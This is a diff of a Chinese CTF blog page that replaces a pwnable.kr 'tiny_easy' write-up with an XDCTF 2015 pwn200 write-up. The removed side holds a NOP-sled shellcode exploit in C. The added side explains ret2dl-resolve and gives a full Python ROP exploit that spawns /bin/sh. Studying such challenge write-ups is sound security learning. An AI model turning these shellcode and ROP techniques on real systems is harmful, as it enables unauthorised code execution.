@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable," />
+  <meta name="keywords" content="Pwnable,练习," />
 
 
 
@@ -84,25 +84,50 @@
 
 
 
-<meta name="description" content="Trick暴力暴力暴力。
-payload里放了一个长度0xff00的sled 。
-tiny_easy@ubuntu:/tmp/pwn$ while truedo./pwndone
-Conclusion刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用checksec看了下，发现开启了NX，以为stack肯定是unexcutable。但是看了别人的writeup后">
+<meta name="description" content="Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
+对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+
+对于.rel.plt段
+
+可在gdb中查看，结构与上图对应
+
+对于.dynsym段
+
+在gdb中查看，结果同样与上图对应">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-tiny-easy">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/27/pwnable-rookiss-tiny-easy/index.html">
+<meta property="og:title" content="xdctf-qual-2015-pwn200">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn200/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Trick暴力暴力暴力。
-payload里放了一个长度0xff00的sled 。
-tiny_easy@ubuntu:/tmp/pwn$ while truedo./pwndone
-Conclusion刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用checksec看了下，发现开启了NX，以为stack肯定是unexcutable。但是看了别人的writeup后">
-<meta property="og:updated_time" content="2016-08-08T08:08:44.000Z">
+<meta property="og:description" content="Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
+对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+
+对于.rel.plt段
+
+可在gdb中查看，结构与上图对应
+
+对于.dynsym段
+
+在gdb中查看，结果同样与上图对应">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/2-1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/2-2.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/3-1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/3-2.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/4.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn200/5.jpg">
+<meta property="og:updated_time" content="2016-08-17T08:00:14.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-tiny-easy">
-<meta name="twitter:description" content="Trick暴力暴力暴力。
-payload里放了一个长度0xff00的sled 。
-tiny_easy@ubuntu:/tmp/pwn$ while truedo./pwndone
-Conclusion刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用checksec看了下，发现开启了NX，以为stack肯定是unexcutable。但是看了别人的writeup后">
+<meta name="twitter:title" content="xdctf-qual-2015-pwn200">
+<meta name="twitter:description" content="Conclusion之前看过@糖果师傅的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。
+对于利用来说，其实只要在.bss段伪造三个结构即可，其分别对应.rel.plt，.dymsym，.dynstr中的结构体，这些段的地址可利用readelf查看，如下所示
+
+对于.rel.plt段
+
+可在gdb中查看，结构与上图对应
+
+对于.dynsym段
+
+在gdb中查看，结果同样与上图对应">
 
 
 
@@ -123,9 +148,9 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/27/pwnable-rookiss-tiny-easy/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn200/"/>
 
-  <title> pwnable.kr-rookiss-tiny-easy | Icemakr's Blog </title>
+  <title> xdctf-qual-2015-pwn200 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -295,7 +320,7 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
             
             
               
-                pwnable.kr-rookiss-tiny-easy
+                xdctf-qual-2015-pwn200
               
             
           </h1>
@@ -307,8 +332,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-27T00:00:00+08:00" content="2016-07-27">
-              2016-07-27
+            <time itemprop="dateCreated" datetime="2016-08-17T00:00:00+08:00" content="2016-08-17">
+              2016-08-17
             </time>
           </span>
 
@@ -321,8 +346,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
                   </a>
                 </span>
 
@@ -337,8 +362,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/27/pwnable-rookiss-tiny-easy/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/27/pwnable-rookiss-tiny-easy/" itemprop="commentsCount"></span>
+                <a href="/2016/08/17/xdctf-qual-2015-pwn200/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/17/xdctf-qual-2015-pwn200/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -361,16 +386,26 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
       
 
       
-        <h2 id="Trick">Trick</h2><p>暴力暴力暴力。</p>
-<p>payload里放了一个长度0xff00的<code>sled</code> 。</p>
-<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">tiny_easy<span class="variable">@ubuntu</span><span class="symbol">:/tmp/pwn</span><span class="variable">$ </span><span class="keyword">while</span> <span class="keyword">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">./pwn</span><br><span class="line">done</span><br></pre></td></tr></table></figure>
-<h2 id="Conclusion">Conclusion</h2><p>刚开始没有想到，也是参考了别人的做法。没想到的原因还是太粗心了，在gdb-peda里用<code>checksec</code>看了下，发现开启了<code>NX</code>，以为stack肯定是unexcutable。但是看了别人的writeup后才发现原来stack是可执行的。（起始我之前也<code>vmmap</code>过。可能是眼花了没看到。）</p>
-<p>我的利用方法是写了个c程序，用<code>execve</code>函数直接控制<code>argv[0]</code>，然后把代码扔到服务器<code>/tmp</code>下编译，另外也可以像引文里，改变环境变量和利用软链接来控制程序执行时的<code>argv[0]</code></p>
-<p>这种做法步骤大致如下</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">mkdir /tmp/pwn</span><br><span class="line">ln <span class="operator">-s</span> /tmp/pwn/tiny_easy /home/tiny_easy/tiny_easy`</span><br><span class="line"><span class="built_in">export</span> PATH=/tmp/pwn:<span class="variable">$PATH</span></span><br><span class="line">whilt <span class="literal">true</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">tiny_easy [payload]</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
-<h2 id="Exploit">Exploit</h2><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line"><span class="special">#</span>include &lt;stdio.h&gt;</span><br><span class="line"><span class="special">#</span>include &lt;string.h&gt;</span><br><span class="line">char shellcode<span class="special">[</span><span class="special">]</span> =</span><br><span class="line">        "<span class="command">\xeb</span><span class="command">\x</span>1a<span class="command">\x</span>5e<span class="command">\x</span>31<span class="command">\xc</span>0<span class="command">\x</span>88<span class="command">\x</span>46<span class="command">\x</span>07<span class="command">\x</span>8d<span class="command">\x</span>1e<span class="command">\x</span>89<span class="command">\x</span>5e<span class="command">\x</span>08<span class="command">\x</span>89<span class="command">\x</span>46"</span><br><span class="line">        "<span class="command">\x</span>0c<span class="command">\xb</span>0<span class="command">\x</span>0b<span class="command">\x</span>89<span class="command">\xf</span>3<span class="command">\x</span>8d<span class="command">\x</span>4e<span class="command">\x</span>08<span class="command">\x</span>8d<span class="command">\x</span>56<span class="command">\x</span>0c<span class="command">\xcd</span><span class="command">\x</span>80<span class="command">\xe</span>8<span class="command">\xe</span>1"</span><br><span class="line">        "<span class="command">\xff</span><span class="command">\xff</span><span class="command">\xff</span><span class="command">\x</span>2f<span class="command">\x</span>62<span class="command">\x</span>69<span class="command">\x</span>6e<span class="command">\x</span>2f<span class="command">\x</span>73<span class="command">\x</span>68";</span><br><span class="line">char payload<span class="special">[</span>0x10000<span class="special">]</span>;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char *argv<span class="special">[</span><span class="special">]</span>)</span><br><span class="line"><span class="special">&#123;</span></span><br><span class="line">    int i = 0;</span><br><span class="line">    for (i = 0; i &lt; 0xff00; i++)<span class="special">&#123;</span></span><br><span class="line">        payload<span class="special">[</span>i<span class="special">]</span> = '<span class="command">\x</span>90';</span><br><span class="line">    <span class="special">&#125;</span></span><br><span class="line">    strcpy(payload + 0xff00, shellcode);</span><br><span class="line"></span><br><span class="line">    char *my_argv<span class="special">[</span><span class="special">]</span> = <span class="special">&#123;</span>"<span class="command">\x</span>38<span class="command">\x</span>5c<span class="command">\xe</span>3<span class="command">\xff</span>", NULL<span class="special">&#125;</span>;</span><br><span class="line">    char *my_env<span class="special">[</span><span class="special">]</span>  = <span class="special">&#123;</span>payload, NULL<span class="special">&#125;</span>;</span><br><span class="line">    execve("./tiny_easy", my_argv, my_env);</span><br><span class="line">    return 0;</span><br><span class="line"><span class="special">&#125;</span></span><br></pre></td></tr></table></figure>
-<h2 id="Referance">Referance</h2><p><a href="https://gist.github.com/ihciah/b921fe522244e5b70e7a" target="_blank" rel="external">https://gist.github.com/ihciah/b921fe522244e5b70e7a</a></p>
-<p><a href="http://www.secbox.cn/hacker/ctf/5547.html" target="_blank" rel="external">http://www.secbox.cn/hacker/ctf/5547.html</a></p>
+        <h2 id="Conclusion">Conclusion</h2><p>之前看过<a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">@糖果师傅</a>的文章，当时也照着文章做了一遍。今天心血来潮又自己独立试了一下。</p>
+<p>对于利用来说，其实只要在<code>.bss段</code>伪造三个结构即可，其分别对应<code>.rel.plt</code>，<code>.dymsym</code>，<code>.dynstr</code>中的结构体，这些段的地址可利用readelf查看，如下所示</p>
+<p><img src="/images/xdctf-qual-2015-pwn200/1.jpg" alt=""></p>
+<p>对于<code>.rel.plt段</code></p>
+<p><img src="/images/xdctf-qual-2015-pwn200/2-1.jpg" alt=""></p>
+<p>可在<strong>gdb</strong>中查看，结构与上图对应</p>
+<p><img src="/images/xdctf-qual-2015-pwn200/2-2.jpg" alt=""></p>
+<p>对于<code>.dynsym段</code></p>
+<p><img src="/images/xdctf-qual-2015-pwn200/3-1.jpg" alt=""></p>
+<p>在<strong>gdb</strong>中查看，结果同样与上图对应</p>
+<p><img src="/images/xdctf-qual-2015-pwn200/3-2.jpg" alt=""></p>
+<p><code>.dynstr段</code></p>
+<p><img src="/images/xdctf-qual-2015-pwn200/4.jpg" alt=""></p>
+<p>dl-resolve会根据下图中<code>plt</code>红框所示部分作为<code>.rel.plt</code>中的偏移，去寻找对应的结构体</p>
+<p><img src="/images/xdctf-qual-2015-pwn200/5.jpg" alt=""></p>
+<p>然后根据偏移找到对应的结构体后，会以<code>info&gt;&gt;8 * 16</code>作为偏移，在<code>.dynsym</code>中寻找对应的结构体</p>
+<p>找到<code>.dynsym</code>中对应的结构体后，会根据其<code>st_name</code>成员作为偏移量，在<code>dynstr</code>中寻找对应的要解析的函数名字符串</p>
+<p>在写exp的时候，只要查看已有的这些结构，去修改其中的作为寻找待解析函数名字符串的一些偏移量即可</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./c14595742a95ebf0944804d8853b834c'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x804839b</span>])</span><br><span class="line"></span><br><span class="line">io.read_line()</span><br><span class="line"></span><br><span class="line">plt_read    = <span class="number">0x08048390</span></span><br><span class="line">plt_resolve = <span class="number">0x0804839b</span></span><br><span class="line"></span><br><span class="line">leave_ret   = <span class="number">0x08048481</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048453</span></span><br><span class="line">ppp_ret     = <span class="number">0x0804856c</span></span><br><span class="line"></span><br><span class="line">adr_stage   = <span class="number">0x0804a000</span> + <span class="number">0x800</span></span><br><span class="line"></span><br><span class="line">payload0  = <span class="string">'A'</span> * <span class="number">0x70</span></span><br><span class="line">payload0 += l32(plt_read)</span><br><span class="line">payload0 += l32(ppp_ret)</span><br><span class="line">payload0 += l32(<span class="number">0</span>)</span><br><span class="line">payload0 += l32(adr_stage)</span><br><span class="line">payload0 += l32(<span class="number">0x500</span>)</span><br><span class="line"></span><br><span class="line">payload0 += l32(pop_ebp_ret)</span><br><span class="line">payload0 += l32(adr_stage)</span><br><span class="line">payload0 += l32(leave_ret)</span><br><span class="line">payload0 += l32(plt_resolve)</span><br><span class="line"></span><br><span class="line">io.writeline(payload0)</span><br><span class="line"></span><br><span class="line">adr_rel_plt         = <span class="number">0x8048318</span></span><br><span class="line">adr_dyn_sym         = <span class="number">0x80481d8</span></span><br><span class="line">adr_dyn_str         = <span class="number">0x8048268</span></span><br><span class="line">adr_fake_rel_plt    = adr_stage + <span class="number">0x100</span></span><br><span class="line">adr_fake_dyn_sym    = adr_stage + <span class="number">0x208</span></span><br><span class="line">adr_fake_dyn_str    = adr_stage + <span class="number">0x300</span></span><br><span class="line">adr_shell           = adr_stage + <span class="number">0x400</span></span><br><span class="line"></span><br><span class="line">got_read        = <span class="number">0x804a004</span></span><br><span class="line"></span><br><span class="line">payload1  = <span class="string">'A'</span> * <span class="number">0x4</span></span><br><span class="line">payload1 += l32(plt_resolve)</span><br><span class="line">payload1 += l32(adr_fake_rel_plt - adr_rel_plt)</span><br><span class="line">payload1 += l32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload1 += l32(adr_shell)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x100</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += l32(got_read)</span><br><span class="line">payload1 += l32((adr_fake_dyn_sym - adr_dyn_sym)/<span class="number">0x10</span>*<span class="number">0x100</span> + <span class="number">0x7</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x208</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += l32(adr_fake_dyn_str - adr_dyn_str)</span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l32(<span class="number">0x0</span>)</span><br><span class="line">payload1 += l32(<span class="number">0x12</span>)</span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x300</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += <span class="string">'system\x00'</span></span><br><span class="line">payload1  = payload1.ljust(<span class="number">0x400</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1 += <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload1)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h2 id="Referance">Referance</h2><p><a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="external">http://drops.wooyun.org/binary/14360</a></p>
 
       
     </div>
@@ -395,6 +430,8 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
           
             <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
           
+            <a href="/tags/练习/" rel="tag">#练习</a>
+          
         </div>
       
 
@@ -402,17 +439,13 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/26/pwnable-rookiss-simple-login/" rel="next" title="pwnable.kr-rookiss-simple-login">
-                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-simple-login
+              <a href="/2016/08/14/pwnable-rookiss-fix/" rel="next" title="pwnable.kr-rookiss-fix">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-fix
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/28/pwnable-rookiss-dragon/" rel="prev" title="pwnable.kr-rookiss-dragon">
-                pwnable.kr-rookiss-dragon <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -544,7 +577,7 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">4.</span> <span class="nav-text">Referance</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">3.</span> <span class="nav-text">Referance</span></a></li></ol></div>
             
           </div>
         </section>
@@ -671,9 +704,9 @@ Conclusion刚开始没有想到，也是参考了别人的做法。没想到的�
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/27/pwnable-rookiss-tiny-easy/';
-      var disqus_title = "pwnable.kr-rookiss-tiny-easy";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/27/pwnable-rookiss-tiny-easy/';
+      var disqus_identifier = '2016/08/17/xdctf-qual-2015-pwn200/';
+      var disqus_title = "xdctf-qual-2015-pwn200";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/17/xdctf-qual-2015-pwn200/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
